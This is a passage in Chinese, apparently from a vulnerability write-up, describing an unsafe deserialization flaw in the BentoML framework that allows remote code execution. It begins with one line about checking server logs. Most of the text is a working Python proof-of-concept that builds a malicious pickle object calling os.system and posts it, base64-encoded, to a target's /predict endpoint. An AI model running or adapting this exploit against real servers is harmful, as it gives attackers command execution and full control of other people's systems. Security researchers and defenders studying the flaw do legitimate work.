    - 检查服务器日志是否有异常反序列化操作

漏洞利用方法
    - BentoML框架存在不安全的反序列化漏洞，允许通过发送特制的POST请求实现远程代码执行
    - 攻击者可以发送精心构造的序列化对象到任何有效的BentoML端点，当服务器反序列化该对象时会执行操作系统命令
    - 此漏洞使攻击者能够完全控制运行BentoML应用程序的服务器，可能导致未授权访问或完全系统控制

import requests
import pickle
import base64

# 目标BentoML服务器地址
target_url = "http://target-server:3000/predict"

# 构造恶意序列化对象（示例）
class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('whoami',))

# 生成恶意payload
malicious_payload = pickle.dumps(Exploit())
encoded_payload = base64.b64encode(malicious_payload).decode()

# 发送恶意请求
headers = {
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0'
}

payload = {
    'data': encoded_payload
}

try:
    response = requests.post(target_url, json=payload, headers=headers, timeout=10)
    print(f"Response Status: {response.status_code}")
    print(f"Response Content: {response.text}")
except Exception as e:
    print(f"Error: {e}")
```
